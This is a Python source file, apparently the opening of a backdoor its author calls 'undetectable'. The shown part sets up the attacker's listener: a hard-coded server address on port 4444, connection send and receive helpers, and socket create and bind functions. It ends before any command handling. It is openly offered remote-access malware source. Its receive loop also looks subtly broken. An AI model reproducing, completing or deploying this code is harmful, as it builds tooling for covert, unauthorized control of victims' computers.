""" Yakuza Backdoor, Undetectable
        This is a Backdoor written in Python based on Yakuza Style
        Version: 1.0
------------------------------------------------------------
Author: Davood Yakuza
Start Developing Date: 11/8/2024 | 18 aban 1403
End Developing Date:

"""

# Step 0: Import requires libraries

# import socket
from socket import socket, SOL_SOCKET, SO_REUSEADDR, error as SocketError
import os
from queue import Queue
from time import sleep
import threading
from sys import exit


""" Section 1: Develop Utitlity Objects(Global Variables, lambda's, functions) """

# Step 2: Define Global Variables

intThreads = 2      # Thread's Number in Multithreading
arrJobs = [1, 2]    # Use for Multithreading, Store Total Jobs

queue = Queue()     # Used for Handling Jobs in Multithreading

arrAddresses = []       # Store All Socket Connection Addresses
arrConnections = []     # Store All Connection Information about Socket Connections

strHost = "192.168.10.100"      # Server IP Address
intPort = 4444                  # Server Port

intBuff = 1024      # Maximum Size(Bytes) of Data to Receive as

# objSocket = None      # Socket Object

# Step 3: Define Global lambda's
decode_utf = lambda data: data.decode("utf-8")

remove_quotes = lambda string: string.replace('\"', '')

# noinspection PyUnresolvedReferences
send = lambda data: conn.send(data)
# noinspection PyUnresolvedReferences
recv = lambda buffer: conn.recv(buffer)


# Step 4: Define a Function to Receive a Large Amount of Data
def recvall(buffer):
    bytesData = b''

    while True:
        bytePart = recv(buffer)

        if len(bytePart) == buffer:
            return bytePart

        bytesData += bytePart

        if len(bytesData) == buffer:
            return bytesData

# Step 5: Define a Function to Create Socket Connection
def create_socket():
    global objSocket
    try:
        objSocket = socket()
        objSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

    except SocketError as e:
        print(f'[-] Error while Creating Socket. \n[-] Error: {e}')


# Step 6: Define a Function to Bind Socket
def socket_bind():
    global objSocket # noqa
    try:
        print(f"[+] Listening on Port: {str(intPort)}")
        objSocket.bind((strHost, intPort)) # noqa
        objSocket.listen(20)

    except SocketError as e:
        print(f'[-] Error while Binding Socket. \n[-] Error: {e}')
        socket_bind()










